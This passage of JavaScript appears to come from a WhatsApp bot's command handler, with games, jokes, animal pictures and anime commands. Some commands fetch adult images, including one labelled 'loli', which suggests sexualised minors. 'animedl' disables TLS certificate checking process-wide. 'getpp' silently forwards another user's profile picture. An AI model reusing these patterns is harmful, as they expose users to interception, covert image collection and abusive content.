            return reply(`❌ *CYBER Wikipedia*\n\nPage "${text}" not found. Try another term.`);
        }
        
        reply(`⚠️ *CYBER Wikipedia*\n\nWikipedia is taking a break. Try again later.`);
    }
}
break;

// ============ HANGMAN GAME ============
case "hangman": {
    const chatId = m.chat;
    const args = text?.split(" ") || [];
    let game = hangmanGames[chatId];

    // Start new game
    if (!game) {
        if (!args[0]) return reply("🎮 *Start:* hangman banana");
        
        const word = args[0].toLowerCase();
        const display = "_".repeat(word.length).split("");
        hangmanGames[chatId] = { 
            word, 
            display, 
            attempts: 6, 
            guessed: [],
            wrongGuesses: 0
        };
        
        const visual = hangmanVisual[0]; // First visual (6 attempts left)
        
        reply(`🎮 *Hangman Started*\n\n` +
              `${visual}\n\n` +
              `Word: ${display.join(" ")}\n` +
              `Attempts: 6\n` +
              `Guess: hangman [letter]`);
        return;
    }

    // Make a guess
    if (!args[0]) return reply("🔤 *Guess a letter* • Example: hangman a");
    
    const letter = args[0].toLowerCase();
    if (letter.length !== 1) return reply("❌ *One letter at a time*");
    if (!/[a-z]/.test(letter)) return reply("❌ *Letters only*");
    if (game.guessed.includes(letter)) return reply("⚠️ *Already guessed*");

    game.guessed.push(letter);
    
    if (game.word.includes(letter)) {
        // Correct guess
        game.display = game.display.map((c, i) => (game.word[i] === letter ? letter : c));
    } else {
        // Wrong guess
        game.wrongGuesses += 1;
        game.attempts -= 1;
    }

    // Get current hangman visual
    const visualIndex = Math.min(game.wrongGuesses, hangmanVisual.length - 1);
    const visual = hangmanVisual[visualIndex];

    // Check win condition
    if (!game.display.includes("_")) {
        reply(`🎉 *You won!*\n\nWord: ${game.word}\n\n${visual}`);
        delete hangmanGames[chatId];
        return;
    }

    // Check lose condition
    if (game.attempts <= 0) {
        reply(`💀 *Game over!*\n\nWord: ${game.word}\n\n${visual}`);
        delete hangmanGames[chatId];
        return;
    }

    // Game continues
    reply(`🎮 *Hangman*\n\n` +
          `${visual}\n\n` +
          `Word: ${game.display.join(" ")}\n` +
          `Attempts: ${game.attempts}\n` +
          `Guessed: ${game.guessed.join(", ")}`);
}
break;
// ======================================

case "numbattle": {
    const userRoll = Math.floor(Math.random() * 100) + 1;
    const botRoll = Math.floor(Math.random() * 100) + 1;
    
    let result = userRoll > botRoll ? "🎉 *You win!*" : 
                 userRoll < botRoll ? "😢 *You lose!*" : "🤝 *It's a tie!*";
    
    reply(`🎲 *Number Battle*\n\nYou: ${userRoll}\nBot: ${botRoll}\n\n${result}`);
}
break;

case "coinbattle": {
    const userFlip = Math.random() < 0.5 ? "Heads" : "Tails";
    const botFlip = Math.random() < 0.5 ? "Heads" : "Tails";
    
    let result = userFlip === botFlip ? "🎉 *You win!*" : "😢 *You lose!*";
    
    reply(`🪙 *Coin Battle*\n\nYou: ${userFlip}\nBot: ${botFlip}\n\n${result}`);
}
break;

case "numberbattle": {
    if (!text) return reply("🎯 *Usage:* numberbattle 25");
    
    const number = Math.floor(Math.random() * 50) + 1;
    const guess = parseInt(text);
    
    let result = guess === number ? "🎉 *Perfect guess!*" : 
                 guess > number ? "⬇️ *Too high!*" : "⬆️ *Too low!*";
    
    reply(`🎯 *Number Battle*\n\nYour guess: ${guess}\nTarget: ${number}\n\n${result}`);
}
break;

case "math": {
    const a = Math.floor(Math.random() * 50) + 1;
    const b = Math.floor(Math.random() * 50) + 1;
    
    reply(`➕ *Math Quiz*\n\n${a} + ${b} = ?\nReply: mathanswer number`);
}
break;

case "emojiquiz": {
    const quizzes = [
        { emoji: "🐍", answer: "snake" },
        { emoji: "🍎", answer: "apple" },
        { emoji: "🏎️", answer: "car" },
        { emoji: "🎸", answer: "guitar" },
        { emoji: "☕", answer: "coffee" }
    ];
    
    const quiz = quizzes[Math.floor(Math.random() * quizzes.length)];
    reply(`🧩 *Emoji Quiz*\n\n${quiz.emoji}\nReply: emojianswer your guess`);
}
break;

case "dice": {
    const roll = Math.floor(Math.random() * 6) + 1;
    reply(`🎲 *You rolled a ${roll}!*`);
}
break;

case "rpsls": {
    if (!text) return reply("🪨 *Choose:* rock, paper, scissors, lizard, spock");
    
    const choices = ["rock", "paper", "scissors", "lizard", "spock"];
    const userChoice = text.toLowerCase();
    
    if (!choices.includes(userChoice)) 
        return reply("❌ *Invalid choice* • Use rock, paper, scissors, lizard, spock");

    const botChoice = choices[Math.floor(Math.random() * choices.length)];

    const winMap = {
        rock: ["scissors", "lizard"],
        paper: ["rock", "spock"],
        scissors: ["paper", "lizard"],
        lizard: ["spock", "paper"],
        spock: ["scissors", "rock"]
    };

    let result = userChoice === botChoice ? "🤝 *It's a tie!*" :
                 winMap[userChoice].includes(botChoice) ? "🎉 *You win!*" : "😢 *You lose!*";

    reply(`🪨 *RPSLS*\n\nYou: ${userChoice}\nBot: ${botChoice}\n\n${result}`);
}
break;
case "coin": {
    const result = Math.random() < 0.5 ? "🪙 Heads" : "🪙 Tails";
    await devtrust.sendMessage(m.chat, { text: `🎲 Coin Flip Result: ${result}` }, { quoted: m });
}
break;
case "gamefact": {
    try {
        const res = await axios.get("https://www.freetogame.com/api/games");
        const games = res.data;
        const game = games[Math.floor(Math.random() * games.length)];
        
        reply(`🎮 *${game.title}*\n🎭 ${game.genre}\n📱 ${game.platform}\n🔗 ${game.game_url}`);
    } catch (e) {
        console.error("GAMEFACT ERROR:", e);
        reply("❌ *Game fact unavailable* • Server offline");
    }
}
break;

case "fox": {
    try {
        const res = await axios.get("https://randomfox.ca/floof/");
        const img = res.data?.image;
        if (!img) return reply("❌ *Fox ran away* • Try again");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🦊 *Random Fox*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("FOX ERROR:", e);
        reply("❌ *Fox hunt failed* • API is sleeping");
    }
}
break;

case "bchcn": {
    try {
        const res = await axios.get("https://some-random-api.ml/img/koala");
        const img = res.data?.link;
        if (!img) return reply("❌ *Koala hiding* • Try again");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐨 *Random Koala*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("KOALA ERROR:", e);
        reply("❌ *Koala fetch failed* • Eucalyptus shortage");
    }
}
break;

case "hxjxjjkm": {
    try {
        const res = await axios.get("https://some-random-api.ml/img/birb");
        const img = res.data?.link;
        if (!img) return reply("❌ *Bird flew away* • Try again");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐦 *Random Bird*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("BIRD ERROR:", e);
        reply("❌ *Bird migration failed* • Try later");
    }
}
break;

case "panda": {
    try {
        const res = await axios.get("https://some-random-api.ml/img/panda");
        const img = res.data?.link;  
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐼 *Random Panda*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("PANDA ERROR:", e);
        reply("❌ *Panda on vacation* • Try again");
    }
}
break;

case "funfact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        const fact = res.data?.text || "Bots are awesome!";
        reply(`💡 *Fun Fact*\n\n${fact}`);
    } catch (e) {
        console.error("FUNFACT ERROR:", e);
        reply("❌ *Fact machine broke* • Try again later");
    }
}
break;

case "vkfkk": {
    try {
        const res = await axios.get("https://api.quotable.io/random");
        const quote = res.data?.content || "Keep pushing forward!";
        const author = res.data?.author || "Unknown";
        reply(`🖋 *"${quote}"*\n— ${author}`);
    } catch (e) {
        console.error("QUOTEMEME ERROR:", e);
        reply("❌ *Quote generator is silent* • Try later");
    }
}
break;

case "prog": {
    try {
        const res = await axios.get("https://v2.jokeapi.dev/joke/Programming?type=single");
        const joke = res.data?.joke || "Why do programmers prefer dark mode? Light attracts bugs!";
        reply(`💻 *Programming Joke*\n\n${joke}`);
    } catch (e) {
        console.error("PROG JOKE ERROR:", e);
        reply("❌ *Joke compiler error* • Try again");
    }
}
break;

case "dadjoke": {
    try {
        const res = await axios.get("https://icanhazdadjoke.com/", { headers: { Accept: "application/json" } });
        const joke = res.data?.joke || "I'm still working on it!";
        reply(`👴 *Dad Joke*\n\n${joke}`);
    } catch (e) {
        console.error("DAD JOKE ERROR:", e);
        reply("❌ *Dad left for milk* • Try later");
    }
}
break;

case "progquote": {
    try {
        const res = await axios.get("https://hdramming-quotes-api.herokuapp.com/quotes/random");
        const quote = res.data?.en || "Talk is cheap. Show me the code.";
        const author = res.data?.author || "Linus Torvalds";
        reply(`💻 *"${quote}"*\n— ${author}`);
    } catch (e) {
        console.error("PROGQUOTE ERROR:", e);
        reply("❌ *Quote not found* • 404 error");
    }
}
break;

case "asciivjxnd": {
    if (!text) return reply("✏️ *Example:* ascii Hello");
    
    try {
        const res = await axios.get(`https://artii.herokuapp.com/make?text=${encodeURIComponent(text)}`);
        const ascii = res.data || text;
        reply(`🎨 *ASCII Art*\n\n\`\`\`${ascii}\`\`\``);
    } catch (e) {
        console.error("ASCII ERROR:", e);
        reply("❌ *ASCII generator failed*");
    }
}
break;

case "guess": {
    const number = Math.floor(Math.random() * 10) + 1;
    if (!text) return reply("🎲 *Usage:* guess 7");
    
    const guess = parseInt(text);
    if (isNaN(guess) || guess < 1 || guess > 10) 
        return reply("❌ *Choose 1-10*");
    
    const result = guess === number ? "🎉 *Correct!*" : "😢 *Wrong guess*";
    reply(`🎯 *Guess Game*\n\nYou: ${guess}\nBot: ${number}\n${result}`);
}
break;

case "moviequote": {
    try {
        const res = await axios.get("https://movie-quote-api.herokuapp.com/v1/quote/");
        const quote = res.data?.quote || "May the Force be with you.";
        const movie = res.data?.show || "Unknown";
        reply(`🎬 *"${quote}"*\n— ${movie}`);
    } catch (e) {
        console.error("MOVIE QUOTE ERROR:", e);
        reply("❌ *Movie quote unavailable* • Cinema closed");
    }
}
break;

case "triviafact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        const fact = res.data?.text || "You're awesome!";
        reply(`🧠 *Trivia Fact*\n\n${fact}`);
    } catch (e) {
        console.error("TRIVIA FACT ERROR:", e);
        reply("❌ *Trivia machine broke*");
    }
}
break;

case "cbhcchhcx": {
    try {
        const res = await axios.get("https://type.fit/api/quotes");
        const quotes = res.data;
        const q = quotes[Math.floor(Math.random() * quotes.length)];
        reply(`🌟 *"${q.text}"*\n— ${q.author || "Unknown"}`);
    } catch (e) {
        console.error("INSPIRE ERROR:", e);
        reply("❌ *Inspiration unavailable*");
    }
}
break;

case "compliment": {
    try {
        const res = await axios.get("https://complimentr.com/api");
        const compliment = res.data?.compliment || "You are awesome!";
        reply(`💖 *${compliment}*`);
    } catch (e) {
        console.error("COMPLIMENT ERROR:", e);
        reply("❌ *Compliment machine is shy* • Try later");
    }
}
break;

case "dog": {
    try {
        const res = await axios.get("https://dog.ceo/api/breeds/image/random");
        const img = res.data?.message;
        if (!img) return reply("❌ *Dog ran away*");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐶 *Random Dog*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("DOG ERROR:", e);
        reply("❌ *Dog fetch failed* • On a walk");
    }
}
break;

case 'sfw': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/sfw' },
            caption: "✨ *CYBER SFW*"
        }), 
        { quoted: m }
    );
}
break;

case 'moe': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/moe' },
            caption: "🌸 *CYBER Moe*"
        }), 
        { quoted: m }
    );
}
break;

case 'aipic': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/aipic' },
            caption: "🤖 *CYBER AI Pic*"
        }), 
        { quoted: m }
    );
}
break;

case 'hentai': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/hentai' },
            caption: "🔞 *CYBER*"
        }), 
        { quoted: m }
    );
}
break;

case 'chinagirl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/chinagirl' },
            caption: "🇨🇳 *CYBER China Girl*"
        }), 
        { quoted: m }
    );
}
break;

case 'bluearchive': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/bluearchive' },
            caption: "📘 *CYBER Blue Archive*"
        }), 
        { quoted: m }
    );
}
break;

case 'boypic': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/boypic' },
            caption: "👦 *CYBER Boy Pic*"
        }), 
        { quoted: m }
    );
}
break;

case 'carimage': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/carimage' },
            caption: "🏎️ *CYBER Car*"
        }), 
        { quoted: m }
    );
}
break;

case 'random-girl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/randomgirl' },
            caption: "👧 *CYBER Random Girl*"
        }), 
        { quoted: m }
    );
}
break;

case 'hijab-girl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/hijabgirl' },
            caption: "🧕 *CYBER Hijab Girl*"
        }), 
        { quoted: m }
    );
}
break;

case 'inCYBEResia-girl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/inCYBEResiagirl' },
            caption: "🇮🇩 *CYBER InCYBEResia Girl*"
        }), 
        { quoted: m }
    );
}
break;

case 'japan-girl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/japangirl' },
            caption: "🇯🇵 *CYBER Japan Girl*"
        }), 
        { quoted: m }
    );
}
break;

case 'korean-girl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/koreangirl' },
            caption: "🇰🇷 *CYBER Korean Girl*"
        }), 
        { quoted: m }
    );
}
break;

case 'loli': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/loli' },
            caption: "🎀 *CYBER*"
        }), 
        { quoted: m }
    );
}
break;

case 'malaysia-girl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/malaysiagirl' },
            caption: "🇲🇾 *CYBER Malaysia Girl*"
        }), 
        { quoted: m }
    );
}
break;

case 'profile-pictures': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/profilepictures' },
            caption: "🖼️ *CYBER Profile Pics*"
        }), 
        { quoted: m }
    );
}
break;

case 'thailand-girl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/thailandgirl' },
            caption: "🇹🇭 *CYBER Thailand Girl*"
        }), 
        { quoted: m }
    );
}
break;

case 'tiktokgirl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/tiktok-girl' },
            caption: "🎵 *CYBER TikTok Girl*"
        }), 
        { quoted: m }
    );
}
break;

case 'vietnam-girl': {
    devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: 'https://apis.prexzyvilla.site/random/vietnamgirl' },
            caption: "🇻🇳 *CYBER Vietnam Girl*"
        }), 
        { quoted: m }
    );
}
break;

case "cat": {
    try {
        const res = await axios.get("https://api.thecatapi.com/v1/images/search");
        const img = res.data[0]?.url;
        if (!img) return reply("❌ *Cat napping* • Try again");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: img },
                caption: "🐱 *Random Cat*"
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("CAT ERROR:", e);
        reply("❌ *Cat fetch failed* • On a mouse hunt");
    }
}
break;

case "rps": {
    if (!text) return reply("🪨 *Choose:* rock, paper, scissors");
    
    const choices = ["rock", "paper", "scissors"];
    const userChoice = text.toLowerCase();
    if (!choices.includes(userChoice)) 
        return reply("❌ *Invalid choice* • Use rock, paper, scissors");

    const botChoice = choices[Math.floor(Math.random() * choices.length)];

    let result = userChoice === botChoice ? "🤝 *Tie!*" :
        (userChoice === "rock" && botChoice === "scissors") ||
        (userChoice === "paper" && botChoice === "rock") ||
        (userChoice === "scissors" && botChoice === "paper") 
        ? "🎉 *You win!*" : "😢 *You lose!*";

    reply(`🪨 *RPS*\n\nYou: ${userChoice}\nBot: ${botChoice}\n${result}`);
}
break;

case "8ball": {
    const answers = [
        "It is certain ✅", "Without a doubt ✅", "Ask again later 🤔",
        "Cannot predict now 🤷", "CYBER't count on it ❌", "Very doubtful ❌"
    ];
    if (!text) return reply("🎱 *Ask me a question*");
    
    const answer = answers[Math.floor(Math.random() * answers.length)];
    reply(`🎱 *Question:* ${text}\n\n${answer}`);
}
break;

case "trivia": {
    try {
        const res = await axios.get("https://opentdb.com/api.php?amount=1&type=multiple");
        const trivia = res.data.results[0];
        const options = [...trivia.incorrect_answers, trivia.correct_answer]
            .sort(() => Math.random() - 0.5);
        
        reply(`❓ *${trivia.question}*\n\n${options.map((o,i)=>`${i+1}. ${o}`).join("\n")}`);
    } catch (e) {
        console.error("TRIVIA ERROR:", e);
        reply("❌ *Trivia unavailable*");
    }
}
break;

case "meme": {
    try {
        const res = await axios.get("https://meme-api.com/gimme");
        const meme = res.data;
        if (!meme?.url) return reply("❌ *Meme ran away*");
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: meme.url },
                caption: `😂 *${meme.title}*`
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error("MEME ERROR:", e);
        reply("❌ *Meme factory closed*");
    }
}
break;

case 'gfx':
case 'gfx2':
case 'gfx3':
case 'gfx4':
case 'gfx5':
case 'gfx6':
case 'gfx7':
case 'gfx8':
case 'gfx9':
case 'gfx10':
case 'gfx11':
case 'gfx12': {
    const [text1, text2] = text.split('|').map(v => v.trim());
    if (!text1 || !text2) {
        return reply(`🎨 *Usage:* ${prefix + command} text1 | text2`);
    }

    reply(`⏳ *Generating GFX...*`);

    try {
        const style = command.toUpperCase();
        const apiUrl = `https://api.nexoracle.com/image-creating/${command}?apikey=d0634e61e8789b051e&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;

        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: apiUrl },
                caption: `🎨 *${style} GFX*\n${text1} | ${text2}`
            }), 
            { quoted: m }
        );
    } catch (err) {
        console.error(err);
        reply(`❌ *GFX generation failed*`);
    }
    break;
}

case 'getpp': {
    // If mention/quote/text provided use that; in a DM use the other person's JID; in group fallback to sender
    let userss = m.mentionedJid[0] ? m.mentionedJid[0] : 
                m.quoted ? m.quoted.sender : 
                text ? (text.replace(/[^0-9]/g, '') + '@s.whatsapp.net') :
                (!m.isGroup ? m.chat : m.sender);
    
    try {
        var ppuser = await devtrust.profilePictureUrl(userss, 'image');
    } catch (err) {
        var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png';
    }
    
    // Silently send to requester's DM — no confirmation message shown
    await devtrust.sendMessage(m.sender, 
        addNewsletterContext({
            image: { url: ppuser },
            caption: `👤 *Profile Picture*\n@${userss.split('@')[0]}`,
            mentions: [userss]
        })
    );
}
break;

case 'yts': 
case 'ytsearch': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    if (!text) return reply(`🔍 *Example:* ${prefix + command} anime music`);
    
    let yts = require("yt-search");
    let search = await yts(text);
    
    let teks = `📺 *YouTube Search*\n\n"${text}"\n\n`;
    let no = 1;
    
    for (let i of search.all.slice(0,5)) {
        teks += `${no++}. *${i.title}*\n⏱️ ${i.timestamp} | 👀 ${i.views}\n🔗 ${i.url}\n\n`;
    }
    
    await devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            image: { url: search.all[0].thumbnail },
            caption: teks
        }), 
        { quoted: m }
    );
}
break;

case 'animewlp': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    
    try {
        // Use nekos.best API (nekos.life is deprecated)
        const waifudd = await axios.get(`https://nekos.best/api/v2/neko?amount=1`);
        const imgUrl = waifudd.data?.results?.[0]?.url;
        if (!imgUrl) throw new Error('No image');
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url: imgUrl },
                caption: "🖼️ *Anime Wallpaper*"
            }), 
            { quoted: m }
        );
    } catch (err) {
        try {
            // Fallback: waifu.im
            const res = await axios.get(`https://api.waifu.im/search?included_tags=waifu&is_nsfw=false`);
            const imgUrl = res.data?.images?.[0]?.url;
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({ image: { url: imgUrl }, caption: "🖼️ *Anime Wallpaper*" }),
                { quoted: m }
            );
        } catch {
            reply('❌ *Error fetching wallpaper*');
        }
    }
}
break;

case 'resetlink': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    await devtrust.groupRevokeInvite(m.chat);
    reply("✅ *Group link reset*");
}
break;

case 'animedl': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    if (!q.includes("|")) {
        return reply("📌 *Format:* animedl Anime Name | Episode");
    }

    try {
        const [animeName, episode] = q.split("|").map(x => x.trim());
        const apiUrl = `https://draculazxy-xyzdrac.hf.space/api/Animedl?q=${encodeURIComponent(animeName)}&ep=${encodeURIComponent(episode)}`;

        process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
        
        const { data } = await axios.get(apiUrl, {
            httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false })
        });

        if (data.STATUS !== 200 || !data.download_link) {
            return reply("❌ *Episode not found*");
        }

        const { anime, episode: epNumber, download_link } = data;

        reply(`🎥 *${anime}* Ep ${epNumber}\n⏳ Downloading...`);

        await devtrust.sendMessage(m.chat, {
            document: { url: download_link },
            mimetype: "video/mp4",
            fileName: `${anime} - Episode ${epNumber}.mp4`
        }, { quoted: m });

    } catch (error) {
        console.error("❌ Anime Downloader Error:", error.message);
        reply("⚠️ *Server Error* • Try again later");
    }
}
break;

case 'animesearch': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    if (!text) return reply(`🔍 *Which anime to search?*\n📌 *Example:* animesearch Naruto`);
    
    try {
        // Use Jikan API v4 (official MAL API, no scraping needed)
        const { data } = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(text)}&limit=1&sfw=true`);
        const anime = data?.data?.[0];
        
        if (!anime) return reply(`❌ *Anime not found:* ${text}`);
        
        const genres = anime.genres?.map(g => g.name).join(', ') || 'N/A';
        const studios = anime.studios?.map(s => s.name).join(', ') || 'N/A';
        
        let animetxt = `🎌 *${anime.title}*\n`;
        if (anime.title_english && anime.title_english !== anime.title) {
            animetxt += `🔤 English: ${anime.title_english}\n`;
        }
        animetxt += `\n🎬 Type: ${anime.type || 'N/A'}\n` +
            `📺 Episodes: ${anime.episodes || '?'}\n` +
            `📈 Status: ${anime.status || 'N/A'}\n` +
            `⭐ Score: ${anime.score || 'N/A'} (${anime.scored_by?.toLocaleString() || 0} votes)\n` +
            `🏆 Rank: #${anime.rank || 'N/A'}\n` +
            `💫 Popularity: #${anime.popularity || 'N/A'}\n` +
            `🎭 Genres: ${genres}\n` +
            `🏢 Studio: ${studios}\n` +
            `📅 Aired: ${anime.aired?.string || 'N/A'}\n\n` +
            `📝 *Synopsis:*\n${(anime.synopsis || 'N/A').substring(0, 400)}${anime.synopsis?.length > 400 ? '...' : ''}`;
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: anime.images?.jpg?.large_image_url || anime.images?.jpg?.image_url },
                caption: animetxt
            }),
            { quoted: m }
        );
    } catch (err) {
        reply(`❌ *Anime search failed* • ${err.message?.substring(0, 100)}`);
    }
}
break;

case 'animehighfive':
case 'animecringe':
case 'animedance':
case 'animehappy':
case 'animeglomp':
case 'animesmug':
case 'animeblush':
case 'animewave':
case 'animesmile':
case 'animepoke':
case 'animewink':
case 'animebonk':
case 'animebully':
case 'animeyeet':
case 'animebite':
case 'animelick':
case 'animekill': {
    if (!isCreator) return reply(`🔒 *Owner only*`);
    
    const action = command.replace('anime', '');
    try {
        // Fixed API URL: api.waifu.pics (not waifu.pics/api)
        const waifudd = await axios.get(`https://api.waifu.pics/sfw/${action}`);
        const gifUrl = waifudd.data?.url;
        if (!gifUrl) throw new Error('No URL');
        
        // Send as GIF video for animated effect
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                video: { url: gifUrl },
                gifPlayback: true,
                caption: `🎌 *Anime ${action}*`
            }),
            { quoted: m }
        );
    } catch (err) {
        // Fallback to nekos.best
        try {
            const nekosMap = {
                highfive: 'highfive', cringe: 'facepalm', dance: 'dance',
                happy: 'happy', glomp: 'glomp', smug: 'smug', blush: 'blush',
                wave: 'wave', smile: 'smile', poke: 'poke', wink: 'wink',
                bonk: 'nod', bully: 'bored', yeet: 'yeet', bite: 'bite',
                lick: 'nom', kill: 'shoot'
            };
            const nekosAction = nekosMap[action] || action;
            const res2 = await axios.get(`https://nekos.best/api/v2/${nekosAction}?amount=1`);
            const imgUrl2 = res2.data?.results?.[0]?.url;
            if (!imgUrl2) throw new Error('No fallback');
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    video: { url: imgUrl2 },
                    gifPlayback: true,
                    caption: `🎌 *Anime ${action}*`
                }),
                { quoted: m }
            );
        } catch {
            reply(`❌ *Anime ${action} failed*`);
        }
    }
}
break;

case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    try {
        const { data } = await axios.get(`https://api.waifu.pics/sfw/${command}`);
        await devtrust.sendImageAsSticker(from, data.url, m, { 
            packname: "CYBER", 
            author: "GAME CHANGER" 
        });
    } catch (err) {
        reply("❌ *Sticker generation failed*");
    }
}
break;

case 'ai': {
    if (!text) return reply('🤖 *Example:* ai Who is Mark Zuckerberg?');

    await devtrust.sendPresenceUpdate('composing', m.chat);

    try {
        const { data } = await axios.post("https://chateverywhere.app/api/chat/", {
            model: { id: "gpt-4", name: "GPT-4", maxLength: 32000 },
            messages: [{ pluginId: null, content: text, role: "user" }],
            temperature: 0.5
        });

        reply(`🤖 *AI*\n\n${data}`);

    } catch (e) {
        reply(`❌ *AI error* • ${e.message}`);
    }
}
break;

case 'idch': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!text) return reply("🔗 *Example:* link channel");
    if (!text.includes("https://whatsapp.com/channel/")) 
        return reply("❌ *Invalid channel link*");
    
    let result = text.split('https://whatsapp.com/channel/')[1];
    let res = await devtrust.newsletterMetadata("invite", result);
    
    let teks = `📢 *Channel Info*\n\n` +
        `🆔 ID: ${res.id}\n` +
        `👤 Name: ${res.name}\n` +
        `👥 Followers: ${res.subscribers}\n` +
        `✔️ Verified: ${res.verification == "VERIFIED" ? "Yes" : "No"}`;
    
    return reply(teks);
}
break;

case 'closetime': {
    if (!isCreator) return reply("🔒 *Owner only*");

    let unit = args[1];
    let value = Number(args[0]);
    if (!value) return reply("*Usage:* closetime 10 minute");

    let timer = unit === 'second' ? value * 1000 :
                unit === 'minute' ? value * 60000 :
                unit === 'hour' ? value * 3600000 :
                unit === 'day' ? value * 86400000 : null;
    
    if (!timer) return reply('*Choose:* second, minute, hour, day');

    reply(`⏳ *Closing in ${value} ${unit}*`);

    setTimeout(async () => {
        try {
            await devtrust.groupSettingUpdate(m.chat, 'announcement');
            reply(`🔒 *Group closed* • Only admins can message`);
        } catch (e) {
            reply('❌ Failed: ' + e.message);
        }
    }, timer);
}
break;

case 'opentime': {
    if (!isCreator) return reply("🔒 *Owner only*");

    let unit = args[1];
    let value = Number(args[0]);
    if (!value) return reply('*Usage:* opentime 5 second');

    let timer = unit === 'second' ? value * 1000 :
                unit === 'minute' ? value * 60000 :
                unit === 'hour' ? value * 3600000 :
                unit === 'day' ? value * 86400000 : null;
    
    if (!timer) return reply('*Choose:* second, minute, hour, day');

    reply(`⏳ *Opening in ${value} ${unit}*`);

    setTimeout(async () => {
        try {
            await devtrust.groupSettingUpdate(m.chat, 'not_announcement');
            reply(`🔓 *Group opened* • Everyone can message`);
        } catch (e) {
            reply('❌ Failed: ' + e.message);
        }
    }, timer);
}
break;

case 'fact': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    try {
        const nyash = await axios.get("https://apis.davidcyriltech.my.id/fact");
        const ilovedavid = nyash.data.fact;
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
                caption: ilovedavid
            }),
            { quoted: m }
        );
    } catch (error) {
        reply("❌ *Fact unavailable*");
    }
    break;
}

case 'listonline': {
    if (!isCreator) {
        return reply(`🔒 *CYBER Online*\n\nOwner only command.`);
    }
    
    if (!m.isGroup) {
        return reply(`👥 *CYBER Online*\n\nThis command only works in groups.`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🟢', key: m.key } });
        
        // Get group metadata first
        const groupMetadata = await devtrust.groupMetadata(m.chat);
